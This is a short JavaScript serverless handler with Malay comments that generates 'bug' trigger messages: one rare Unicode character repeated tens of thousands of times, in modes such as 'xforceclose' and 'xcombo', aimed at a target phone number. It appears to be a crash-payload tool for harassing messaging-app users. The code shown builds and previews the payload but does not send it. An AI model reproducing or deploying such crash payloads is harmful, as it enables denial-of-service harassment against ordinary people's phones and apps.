export default async function handler(req, res) {
  const { type, target } = req.query;

  // Periksa parameter
  if (!type || !target) {
    return res.status(400).json({
      success: false,
      error: 'Parameter "type" dan "target" diperlukan. Contoh: ?type=xcombo&target=60123456789'
    });
  }

  // Simbol untuk bug
  const bugSymbol = "𑲭";
  let triggerText = '';

  // Pilihan jenis bug
  switch (type.toLowerCase()) {
    case 'xforceclose':
      triggerText = bugSymbol.repeat(60000);
      break;

    case 'xinvisible':
      triggerText = "InvisibleBug" + bugSymbol.repeat(50000);
      break;

    case 'xviewonce':
      triggerText = "🔁VIEWONCE🔁" + bugSymbol.repeat(30000);
      break;

    case 'xcombo':
      triggerText = "COMBO🔥" + bugSymbol.repeat(70000);
      break;

    default:
      return res.status(400).json({
        success: false,
        error: 'Jenis bug tidak valid. Guna salah satu: xforceclose, xinvisible, xviewonce, xcombo'
      });
  }

  // Log di Vercel
  console.log(`[Dilx Trigger] Type: ${type} | Target: ${target} | Length: ${triggerText.length}`);

  // Response JSON
  return res.status(200).json({
    success: true,
    target,
    type,
    triggerLength: triggerText.length,
    preview: triggerText.slice(0, 100) + '...',
    message: 'Trigger bug berjaya dijana.'
  });
}
